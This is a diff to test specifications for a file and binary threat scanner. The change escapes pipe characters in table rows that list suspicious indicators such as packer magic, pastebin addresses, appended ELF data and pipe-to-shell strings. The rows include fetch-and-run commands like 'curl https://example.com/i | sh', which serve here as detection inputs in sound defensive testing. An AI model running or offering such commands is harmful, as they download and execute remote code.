@@ -15,7 +15,7 @@ Feature: Sweeping a tree or binary for threats
       | contains only ordinary text                             | BINARY TRIAGE           | NO TAMPER SIGNALS | 0    |
       | carries UPX packer magic                                | packed (UPX)            | SUSPICIOUS        | 1    |
       | embeds a pastebin.com address                           | C2/pipe-to-shell string | SUSPICIOUS        | 1    |
-      | embeds "curl http://x/y | sh"                           | C2/pipe-to-shell string | SUSPICIOUS        | 1    |
+      | embeds "curl http://x/y \| sh"                          | C2/pipe-to-shell string | SUSPICIOUS        | 1    |
       | is an ELF with 8 KiB appended after its section headers | after section headers   | SUSPICIOUS        | 1    |
       | has zip or 7z archive magic in its last 256 KiB         | embedded archive magic  | SUSPICIOUS        | 1    |
 
@@ -28,7 +28,7 @@ Feature: Sweeping a tree or binary for threats
 
     Examples:
       | content                                                     | verdict                         | code |
-      | whose install.sh contains "curl https://example.com/i | sh" | SUSPICIOUS                      | 1    |
+      | whose install.sh contains "curl https://example.com/i \| sh" | SUSPICIOUS                      | 1    |
       | with a committed ELF executable                             | SUSPICIOUS                      | 1    |
       | with a setuid file                                          | SUSPICIOUS                      | 1    |
       | whose only pipe-to-shell line is in a file under /tests/    | NO HIGH-SIGNAL PATTERNS MATCHED | 0    |
